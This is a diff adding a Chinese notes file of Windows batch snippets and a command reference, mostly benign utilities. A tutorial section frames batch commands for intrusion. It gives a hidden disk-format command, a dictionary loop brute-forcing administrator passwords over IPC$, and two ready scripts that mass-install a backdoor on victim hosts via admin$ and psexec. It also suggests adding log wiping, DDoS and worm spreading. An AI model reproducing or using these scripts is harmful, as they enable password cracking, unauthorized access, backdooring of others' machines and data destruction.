@@ -1,0 +1,428 @@
+2000xp停止打印
+@ECHO 请先关闭打印机电源
+@ECHO OFF
+PAUSE
+NET STOP SPOOLER
+DEL C:\WINDOWS\system32\spool\PRINTERS\*.*  /Q
+NET START SPOOLER
+
+
+
+目录信息
+@rem 此BAT文件名一定不能是"tree.bat",否则tree命令会实效,不知道为什么
+@rem 可能是因为系统目录有"tree.com",系统会混淆吧.
+@rem 用"dir.bat"作文件名却可以.
+@echo off
+rem 在当前目录生成很漂亮的结构树
+tree /f > 1.TXT
+rem 象DIR命令一样,不过每个下级目录文件也列出
+DIR /S > 2.txt
+rem 简洁地列出目录当前目录文件
+DIR /d > 3.txt
+
+
+
+建立回收站
+@echo off
+:: 建立回收站
+:: Recycle位置可以随意放置，名字也可随便取
+:: 如果在某个分区里建了多个带回收站功能的文件夹，那么它们指向的都是同一个位置
+md %drv%:\Recycle>nul 2>nul
+attrib +s +h %drv%:\Recycle>nul 2>nul
+(echo [.ShellClassInfo]
+echo CLSID={645FF040-5081-101B-9F08-00AA002F954E})>C:\tmp
+copy c:\tmp %drv%:\Recycle\desktop.ini>nul 2>nul
+del c:\tmp>nul 2>nul
+attrib +s +h %drv%:\Recycle\desktop.ini
+
+
+获取某路径下所有文件
+@echo off
+:: 判断输入路径是不是文件夹，如果是，则获取文件夹下的所有文件名(包括子文件夹下的)
+:: 如果要文件名带上路径，则需要在dir这一句的%%~nxi上作改动
+::              code by jm CMD@XP 2006-7-20
+if exist list.txt del list.txt /q
+:input
+cls
+set input=:
+set /p input=           请输入要进行判断的路径：
+set "input=%input:"=%"
+:: 上面这句为判断%input%中是否存在引号，有则剔除。
+if "%input%"==":" goto input
+if not exist "%input%" goto input
+for %%i in ("%input%") do if /i "%%~di"==%%i goto input
+pushd %cd%
+cd /d "%input%">nul 2>nul || exit
+set cur_dir=%cd%
+popd
+for /f "delims=" %%i in ('dir /b /a-d /s "%input%"') do echo %%~nxi>>list.txt
+if not exist list.txt goto no_file
+start list.txt
+exit
+:no_file
+cls
+echo       %cur_dir% 文件夹下没有单独的文件
+pause
+
+
+
+
+删除桌面程序
+@echo off 
+c: 
+cd %userprofile%\桌面
+（cd %userprofile%\desktop ）
+if exist name.gif del name.gif
+pause 
+exit
+
+
+
+运行网页
+@echo off
+set /p a=请输入您要下载的地址:www.
+set input=%a%
+start www.%input% 百度搜索
+@echo off
+set a=
+set/p a=请输入关键字……  
+start http://www.baidu.com/s?wd=%a%
+
+
+
+
+文件自身复制
+copy %0 d:\
+
+
+
+随机数
+@echo off 
+echo 请输入想产生的随机数的最大值,如1-100就输入100 
+set /p s= 
+echo 请输入显示的个数 
+set /p g= 
+cls 
+set count=0 
+:loop 
+set /a num=%random%%%%s%+1 
+if not defined num%num% ( 
+set num%num%=%num% 
+set /a count+=1 
+call echo %%num%% 
+) 
+if %count% lss %g% goto loop
+pause>nul
+
+
+
+
+
+倒计时（全屏）
+@echo off
+echo exit|%ComSpec% /k prompt e 100 B4 00 B0 12 CD 10 B0 03 CD 10 CD 20 $_g$_q$_|debug>nul
+chcp 437>nul
+graftabl 936>nul
+set all=20
+:start
+if "%all%"=="0" goto end
+cls
+set /a all=%all%-1
+echo.
+echo.
+echo.
+echo.
+echo                           %all%
+echo wscript.sleep 500>>ri.vbs &call ri.vbs &del ri.vbs
+goto start
+:end
+cls
+echo                                              The End
+pause
+
+
+
+
+弹出对话框
+@echo msgbox "对话框显示内容！">msg.vbs 
+@msg.vbs
+@del msg.vbs
+
+
+
+study
+全屏幕界面
+
+@echo off
+echo exit|%ComSpec% /k prompt e 100 B4 00 B0 12 CD 10 B0 03 CD 10 CD 20 $_g$_q$_|debug>nul
+chcp 437>nul
+graftabl 936>nul
+pause
+ Copyright ©2011 lyt. All Rights Reserved.
+
+
+
+
+
+study
+最小化运行批处理
+
+::最小化运行批处理
+@echo off&&mode con cols=15 lines=1
+:: Code by everest79 2007-1-17 CMD@XP
+:: 出处：http://www.cn-dos.net/forum/viewthread.php?tid=25095
+%1 %2
+start /min /i "" "%~nx0" goto min&&goto :eof
+:min
+echo xxx
+pause>nul
+exit
+@echo off
+:: Code by zh159 2006-11-25 CMD@XP
+:: 出处：http://www.cn-dos.net/forum/viewthread.php?tid=25095
+mode con cols=15 lines=1
+if exist "Temp.bat" goto Start
+>Temp.bat echo start/min "" "%~nx0"^&exit
+start/min Temp.bat&exit
+:Start
+del "Temp.bat">nul
+pause
+ Copyright ©2011 lyt. All Rights Reserved.
+
+
+
+study
+发送消息
+
+Windows XP/2000中提供了一条发送网络消息的命令net send，使用该命令也可以向局域网/广域网发送一条消息，注意不能跨网段!命令格式为:net send计算机名/IP地址 “消息内容”。
+例如：要给IP地址为192.192.192.1的电脑，发送“还有5分钟就下班关闭服务器了”这条消息，可以这样操作:
+单击菜单“开始”/程序/附件/命令提示符，键入以下命令:
+net send 192.192.192.1 "还有5分钟就下班关闭服务器了"
+稍等片刻，192.192.192.1电脑桌面上将会弹出一个标题为“信使服务”的窗口，里面显示你发送的消息。
+小提示:假如对方关闭了Messenger服务，这条消息就不会显示了。如果你不想收到该类消息，也可以点击菜单“开始”/设置/控制面板/管理工具/服务，在服务中关闭“Messenger服务”；
+ Copyright ©2011 lyt. All Rights Reserved.
+
+
+
+
+
+
+
+1.Echo 命令
+打开回显或关闭请求回显功能，或显示消息。如果没有任何参数，echo 命令将显示当前回显设置。
+语法
+echo [{on|off}] [message]
+Sample：echo off / echo hello world
+在实际应用中我们会把这条命令和重定向符号（也称为管道符号，一般用> >> ^）结合来实现输入一些命令到特定格式的文件中.这将在以后的例子中体现出来。
+2.@ 命令
+表示不显示@后面的命令，在入侵过程中（例如使用批处理来格式化敌人的硬盘）自然不能让对方看到你使用的命令啦。
+Sample：@echo off
+@echo Now initializing the program,please wait a minite...
+@format X: /q/u/autoset (format 这个命令是不可以使用/y这个参数的，可喜的是微软留了个autoset这个参数给我们，效果和/y是一样的。)3.Goto 命令
+指定跳转到标签，找到标签后，程序将处理从下一行开始的命令。
+语法：goto label （label是参数，指定所要转向的批处理程序中的行。） 
+Sample：
+if {%1}=={} goto noparms
+if {%2}=={} goto noparms（如果这里的if、%1、%2你不明白的话，先跳过去，后面会有详细的解释。）
+@Rem check parameters if null show usage
+:noparms
+echo Usage: monitor.bat ServerIP PortNumber
+goto end
+标签的名字可以随便起，但是最好是有意义的字母啦，字母前加个：用来表示这个字母是标签，goto命令就是根据这个：来寻找下一步跳到到那里。最好有一些说明这样你别人看起来才会理解你的意图啊。4.Rem 命令
+注释命令，在C语言中相当与/*--------*/,它并不会被执行，只是起一个注释的作用，便于别人阅读和你自己日后修改。
+Rem Message
+Sample：@Rem Here is the description.5.Pause 命令
+运行 Pause 命令时，将显示下面的消息： 
+Press any key to continue . . . 
+Sample：
+@echo off 
+:begin 
+copy a:*.* d：\back
+echo Please put a new disk into driver A 
+pause 
+goto begin 
+在这个例子中，驱动器 A 中磁盘上的所有文件均复制到d:\back中。显示的注释提示您将另一张磁盘放入驱动器 A 时，pause 命令会使程序挂起，以便您更换磁盘，然后按任意键继续处理。6.Call 命令
+从一个批处理程序调用另一个批处理程序，并且不终止父批处理程序。call 命令接受用作调用目标的标签。如果在脚本或批处理文件外使用 Call，它将不会在命令行起作用。
+语法
+call [[Drive:][Path] FileName [BatchParameters]] [:label [arguments]]
+参数
+[Drive:}[Path] FileName 
+指定要调用的批处理程序的位置和名称。filename 参数必须具有 .bat 或 .cmd 扩展名。7.start 命令
+调用外部程序，所有的DOS命令和命令行程序都可以由start命令来调用。
+入侵常用参数：
+MIN 开始时窗口最小化
+SEPARATE 在分开的空间内开始 16 位 Windows 程序
+HIGH 在 HIGH 优先级类别开始应用程序
+REALTIME 在 REALTIME 优先级类别开始应用程序
+WAIT 启动应用程序并等候它结束
+parameters 这些为传送到命令/程序的参数
+执行的应用程序是 32-位 GUI 应用程序时，CMD.EXE 不等应用程序终止就返回命令提示。如果在命令脚本内执行，该新行为则不会发生。
+8.choice 命令
+choice 使用此命令可以让用户输入一个字符，从而运行不同的命令。使用时应该加/c:参数，c:后应写提示可输入的字符，之间无空格。它的返回码为1234……如: choice /c:dme defrag,mem,end
+将显示
+defrag,mem,end[D,M,E]?
+Sample：
+Sample.bat的内容如下: 
+@echo off 
+choice /c:dme defrag,mem,end 
+if errorlevel 3 goto defrag （应先判断数值最高的错误码）
+if errorlevel 2 goto mem 
+if errotlevel 1 goto end :defrag 
+c:\dos\defrag 
+goto end 
+:mem 
+mem 
+goto end 
+:end 
+echo good bye此文件运行后，将显示 defrag,mem,end[D,M,E]? 用户可选择d m e ，然后if语句将作出判断，d表示执行标号为defrag的程序段，m表示执行标号为mem的程序段，e表示执行标号为end的程序段，每个程序段最后都以goto end将程序跳到end标号处，然后程序将显示good bye，文件结束。9.If 命令if 表示将判断是否符合规定的条件，从而决定执行不同的命令。 有三种格式: 
+1、if "参数" == "字符串" 待执行的命令 
+参数如果等于指定的字符串，则条件成立，运行命令，否则运行下一句。(注意是两个等号）
+如if "%1"=="a" format a: 
+if {%1}=={} goto noparms
+if {%2}=={} goto noparms2、if exist 文件名 待执行的命令 
+如果有指定的文件，则条件成立，运行命令，否则运行下一句。
+如if exist config.sys edit config.sys 3、if errorlevel / if not errorlevel 数字 待执行的命令 
+如果返回码等于指定的数字，则条件成立，运行命令，否则运行下一句。
+如if errorlevel 2 goto x2 
+DOS程序运行时都会返回一个数字给DOS，称为错误码errorlevel或称返回码，常见的返回码为0、1。10.for 命令
+for 命令是一个比较复杂的命令，主要用于参数在指定的范围内循环执行命令。
+在批处理文件中使用 FOR 命令时，指定变量请使用 %%variablefor {%variable|%%variable} in (set) do command [ CommandLineOptions]
+%variable 指定一个单一字母可替换的参数。(set) 指定一个或一组文件。可以使用通配符。command 指定对每个文件执行的命令。command-parameters 为特定命令指定参数或命令行开关。在批处理文件中使用 FOR 命令时，指定变量请使用 %%variable而不要用 %variable。变量名称是区分大小写的，所以 %i 不同于 %I如果命令扩展名被启用，下列额外的 FOR 命令格式会受到支持:FOR /D %variable IN (set) DO command [command-parameters]如果集中包含通配符，则指定与目录名匹配，而不与文件名匹配。FOR /R [[drive:]path] %variable IN (set) DO command [command-检查以 [drive:]path 为根的目录树，指向每个目录中的FOR 语句。如果在 /R 后没有指定目录，则使用当前目录。如果集仅为一个单点(.)字符，则枚举该目录树。FOR /L %variable IN (start,step,end) DO command [command-para该集表示以增量形式从开始到结束的一个数字序列。因此，(1,1,5) 将产生序列 1 2 3 4 5，(5,-1,1) 将产生序列 (5 4 3 2 1)。FOR /F ["options"] %variable IN (file-set) DO command 
+FOR /F ["options"] %variable IN ("string") DO command 
+FOR /F ["options"] %variable IN (command) DO command 或者，如果有 usebackq 选项:FOR /F ["options"] %variable IN (file-set) DO command 
+FOR /F ["options"] %variable IN ("string") DO command 
+FOR /F ["options"] %variable IN (command) DO command filenameset 为一个或多个文件名。继续到 filenameset 中的下一个文件之前，每份文件都已被打开、读取并经过处理。处理包括读取文件，将其分成一行行的文字，然后将每行解析成零或更多的符号。然后用已找到的符号字符串变量值调用 For 循环。以默认方式，/F 通过每个文件的每一行中分开的第一个空白符号。跳过空白行。您可通过指定可选 "options"参数替代默认解析操作。这个带引号的字符串包括一个或多个指定不同解析选项的关键字。这些关键字为:eol=c - 指一个行注释字符的结尾(就一个)skip=n - 指在文件开始时忽略的行数。delims=xxx - 指分隔符集。这个替换了空格和跳格键的默认分隔符集。tokens=x,y,m-n - 指每行的哪一个符号被传递到每个迭代的 for 本身。这会导致额外变量名称的格式为一个范围。通过 nth 符号指定 m符号字符串中的最后一个字符星号，那么额外的变量将在最后一个符号解析之分配并接受行的保留文本。usebackq - 指定新语法已在下类情况中使用:在作为命令执行一个后引号的字符串并且引号字符为文字字符串命令并允许在 fi中使用双引号扩起文件名称。sample1:FOR /F "eol=; tokens=2,3* delims=, " %i in (myfile.txt) do command会分析 myfile.txt 中的每一行，忽略以分号打头的那些行，将
+每行中的第二个和第三个符号传递给 for 程序体；用逗号和/或空格定界符号。请注意，这个 for 程序体的语句引用 %i 来取得第二个符号，引用 %j 来取得第三个符号，引用 %k来取得第三个符号后的所有剩余符号。对于带有空格的文件名，您需要用双引号将文件名括起来。为了用这种方式来使用双引号，您还需要使用 usebackq 选项，否则，双引号被理解成是用作定义某个要分析的字符串的。%i 专门在 for 语句中得到说明，%j 和 %k 是通过tokens= 选项专门得到说明的。您可以通过 tokens= 一行指定最多 26 个符号，只要不试图说明一个高于字母 z 或Z 的变量。请记住，FOR 变量是单一字母、分大小写和全局的；同时不能有 52 个以上都在使用中。您还可以在相邻字符串上使用 FOR /F 分析逻辑；方法是，用单引号将括号之间的 filenameset 括起来。这样，该字符串会被当作一个文件中的一个单一输入行。最后，您可以用 FOR /F 命令来分析命令的输出。方法是，将括号之间的 filenameset 变成一个反括字符串。该字符串会被当作命令行，传递到一个子 CMD.EXE，其输出会被抓进内存，并被当作文件分析。因此，以下例子:FOR /F "usebackq delims==" %i IN (`set`) DO @echo %i会枚举当前环境中的环境变量名称。另外，FOR 变量参照的替换已被增强您现在可以使用下列
+选项语法:~I - 删除任何引号(")，扩充 %I
+%~fI - 将 %I 扩充到一个完全合格的路径名
+%~dI - 仅将 %I 扩充到一个驱动器号
+%~pI - 仅将 %I 扩充到一个路径
+%~nI - 仅将 %I 扩充到一个文件名
+%~xI - 仅将 %I 扩充到一个文件扩展名
+%~sI - 扩充的路径只含有短名
+%~aI - 将 %I 扩充到文件的文件属性
+%~tI - 将 %I 扩充到文件的日期/时间
+%~zI - 将 %I 扩充到文件的大小
+%~$PATH:I - 查找列在路径环境变量的目录，并将 %I 扩充
+到找到的第一个完全合格的名称。如果环境变量
+未被定义，或者没有找到文件，此组合键会扩充
+空字符串可以组合修饰符来得到多重结果:%~dpI - 仅将 %I 扩充到一个驱动器号和路径
+%~nxI - 仅将 %I 扩充到一个文件名和扩展名
+%~fsI - 仅将 %I 扩充到一个带有短名的完整路径名
+%~dp$PATH:i - 查找列在路径环境变量的目录，并将 %I 扩充
+到找到的第一个驱动器号和路径。
+%~ftzaI - 将 %I 扩充到类似输出线路的 DIR在以上例子中，%I 和 PATH 可用其他有效数值代替。%~ 语法
+用一个有效的 FOR 变量名终止。选取类似 %I 的大写变量名
+比较易读，而且避免与不分大小写的组合键混淆。以上是MS的官方帮助，下面我们举几个例子来具体说明一下For命令在入侵中的用途。sample2：利用For命令来实现对一台目标Win2k主机的暴力密码破解。
+我们用net use \\ip\ipc$ "password" /u:"administrator"来尝试这和目标主机进行连接，当成功时记下密码。
+最主要的命令是一条：for /f i% in (dict.txt) do net use \\ip\ipc$ "i%" /u:"administrator"
+用i%来表示admin的密码，在dict.txt中这个取i%的值用net use 命令来连接。然后将程序运行结果传递给find命令－－
+for /f i%% in (dict.txt) do net use \\ip\ipc$ "i%%" /u:"administrator"|find ":命令成功完成">>D:\ok.txt ，这样就ko了。sample3：你有没有过手里有大量肉鸡等着你去种后门＋木马呢？，当数量特别多的时候，原本很开心的一件事都会变得很郁闷：）。文章开头就谈到使用批处理文件，可以简化日常或重复性任务。那么如何实现呢？呵呵，看下去你就会明白了。主要命令也只有一条：（在批处理文件中使用 FOR 命令时，指定变量使用 %%variable）
+@for /f "tokens=1,2,3 delims= " %%i in (victim.txt) do start call door.bat %%i %%j %%k
+tokens的用法请参见上面的sample1，在这里它表示按顺序将victim.txt中的内容传递给door.bat中的参数%i %j %k。
+而cultivate.bat无非就是用net use命令来建立IPC$连接，并copy木马＋后门到victim，然后用返回码（If errorlever =）来筛选成功种植后门的主机，并echo出来，或者echo到指定的文件。
+delims= 表示vivtim.txt中的内容是一空格来分隔的。我想看到这里你也一定明白这victim.txt里的内容是什么样的了。应该根据%%i %%j %%k表示的对象来排列，一般就是 ip password username。
+代码雏形：--------------- cut here then save as a batchfile(I call it main.bat ) --------------------
+@echo off
+@if "%1"=="" goto usage
+@for /f "tokens=1,2,3 delims= " %%i in (victim.txt) do start call IPChack.bat %%i %%j %%k
+@goto end
+:usage
+@echo run this batch in dos modle.or just double-click it.
+:end
+--------------- cut here then save as a batchfile(I call it main.bat ) --------------------------------------- cut here then save as a batchfile(I call it door.bat) -----------------
+@net use \\%1\ipc$ %3 /u:"%2"
+@if errorlevel 1 goto failed
+@echo Trying to establish the IPC$ connection …………OK
+@copy windrv32.exe\\%1\admin$\system32 && if not errorlevel 1 echo IP %1 USER %2 PWD %3 >>ko.txt
+@p***ec \\%1 c:\winnt\system32\windrv32.exe
+@p***ec \\%1 net start windrv32 && if not errorlevel 1 echo %1 Backdoored >>ko.txt
+:failed
+@echo Sorry can not connected to the victim.
+----------------- cut here then save as a batchfile(I call it door.bat) -------------------
+这只是一个自动种植后门批处理的雏形，两个批处理和后门程序（Windrv32.exe）,PSexec.exe需放在统一目录下.批处理内容
+尚可扩展,例如:加入清除日志+DDOS的功能,加入定时添加用户的功能,更深入一点可以使之具备自动传播功能(蠕虫).此处不多做叙述,有兴趣的朋友可自行研究.
+有关某个命令的详细信息，请键入 HELP 命令名
+XP.CMD命令大全
+有关某个命令的详细信息，请键入 HELP 命令名
+ASSOC 显示或修改文件扩展名关联。
+AT 计划在计算机上运行的命令和程序。
+ATTRIB 显示或更改文件属性。
+BREAK 设置或清除扩展式 CTRL+C 检查。
+CACLS 显示或修改文件的访问控制列表(ACLs)。
+CALL 从另一个批处理程序调用这一个。
+CD 显示当前目录的名称或将其更改。
+CHCP 显示或设置活动代码页数。
+CHDIR 显示当前目录的名称或将其更改。
+CHKDSK 检查磁盘并显示状态报告。
+CHKNTFS 显示或修改启动时间磁盘检查。
+CLS 清除屏幕。
+CMD 打开另一个 Windows 命令解释程序窗口。
+COLOR 设置默认控制台前景和背景颜色。
+COMP 比较两个或两套文件的内容。
+COMPACT 显示或更改 NTFS 分区上文件的压缩。
+CONVERT 将 FAT 卷转换成 NTFS。您不能转换
+当前驱动器。
+COPY 将至少一个文件复制到另一个位置。
+DATE 显示或设置日期。
+DEL 删除至少一个文件。
+DIR 显示一个目录中的文件和子目录。
+DISKCOMP 比较两个软盘的内容。
+DISKCOPY 将一个软盘的内容复制到另一个软盘。
+DOSKEY 编辑命令行、调用 Windows 命令并创建宏。
+ECHO 显示消息，或将命令回显打开或关上。
+ENDLOCAL 结束批文件中环境更改的本地化。
+ERASE 删除至少一个文件。
+EXIT 退出 CMD.EXE 程序(命令解释程序)。
+FC 比较两个或两套文件，并显示
+不同处。
+FIND 在文件中搜索文字字符串。
+FINDSTR 在文件中搜索字符串。
+FOR 为一套文件中的每个文件运行一个指定的命令。
+FORMAT 格式化磁盘，以便跟 Windows 使用。
+FTYPE 显示或修改用于文件扩展名关联的文件类型。
+GOTO 将 Windows 命令解释程序指向批处理程序
+中某个标明的行。
+GRAFTABL 启用 Windows 来以图像模式显示
+扩展字符集。
+HELP 提供 Windows 命令的帮助信息。
+IF 执行批处理程序中的条件性处理。
+LABEL 创建、更改或删除磁盘的卷标。
+MD 创建目录。
+MKDIR 创建目录。
+MODE 配置系统设备。
+MORE 一次显示一个结果屏幕。
+MOVE 将文件从一个目录移到另一个目录。
+PATH 显示或设置可执行文件的搜索路径。
+PAUSE 暂停批文件的处理并显示消息。
+POPD 还原 PUSHD 保存的当前目录的上一个值。
+PRINT 打印文本文件。
+PROMPT 更改 Windows 命令提示符。
+PUSHD 保存当前目录，然后对其进行更改。
+RD 删除目录。
+RECOVER 从有问题的磁盘恢复可读信息。
+REM 记录批文件或 CONFIG.SYS 中的注释。
+REN 重命名文件。
+RENAME 重命名文件。
+REPLACE 替换文件。
+RMDIR 删除目录。
+SET 显示、设置或删除 Windows 环境变量。
+SETLOCAL 开始批文件中环境更改的本地化。
+SHIFT 更换批文件中可替换参数的位置。
+SORT 对输入进行分类。
+START 启动另一个窗口来运行指定的程序或命令。
+SUBST 将路径跟一个驱动器号关联。
+TIME 显示或设置系统时间。
+TITLE 设置 CMD.EXE 会话的窗口标题。
+TREE 以图形模式显示驱动器或路径的目录结构。
+TYPE 显示文本文件的内容。
+VER 显示 Windows 版本。
+VERIFY 告诉 Windows 是否验证文件是否已正确
+写入磁盘。
+VOL 显示磁盘卷标和序列号。
+XCOPY 复制文件和目录树。
+appwiz.cpl------------添加删除程序control userpasswords2--------用户帐户设置cleanmgr-------垃圾整理CMD--------------命令提示符可以当作是 Windows 的一个附件，Ping，Convert 这些不能在图形环境下 使用的功能要借助它来完成。cmd------jview察看Java虚拟机版本。
+command.com------调用的则是系统内置的 NTVDM，一个 DOS虚拟机。它完全是一个类似 Virtual PC 的 虚拟环境，和系统本身联系不大。当我们在命令提示符下运行 DOS 程序时，实际上也 是自动转移到 NTVDM虚拟机下，和 CMD 本身没什么关系。
+calc-----------启动计算器chkdsk.exe-----Chkdsk磁盘检查compmgmt.msc---计算机管理conf-----------启动 netmeetingcontrol userpasswords2-----User Account 权限设置devmgmt.msc--- 设备管理器diskmgmt.msc---磁盘管理实用程序dfrg.msc-------磁盘碎片整理程序drwtsn32------ 系统医生dvdplay--------启动Media Playerdxdiag-----------DirectX Diagnostic Toolgpedit.msc-------组策略编辑器gpupdate /target:computer /force 强制刷新组策略eventvwr.exe-----事件查看器explorer-------打开资源管理器logoff---------注销命令lusrmgr.msc----本机用户和组msinfo32---------系统信息msconfig---------系统配置实用程序net start (servicename)----启动该服务net stop (servicename)-----停止该服务notepad--------打开记事本nusrmgr.cpl-------同control userpasswords，打开用户帐户控制面板Nslookup-------IP地址侦测器oobe/msoobe /a----检查XP是否激活perfmon.msc----计算机性能监测程序progman--------程序管理器regedit----------注册表编辑器regedt32-------注册表编辑器regsvr32 /u *.dll----停止dll文件运行route print------查看路由表 rononce -p ----15秒关机rsop.msc-------组策略结果集rundll32.exe rundll32.exe %Systemroot%System32shimgvw.dll,ImageView_Fullscreen----启动一个空白的Windows 图片和传真查看器secpol.msc--------本地安全策略services.msc---本地服务设置sfc /scannow-----启动系统文件检查器sndrec32-------录音机taskmgr-----任务管理器（适用于2000／xp／2003）tsshutdn-------60秒倒计时关机命令winchat--------XP自带局域网聊天winmsd---------系统信息winver-----显示About Windows 窗口wupdmgr-----------Windows Update
+
+
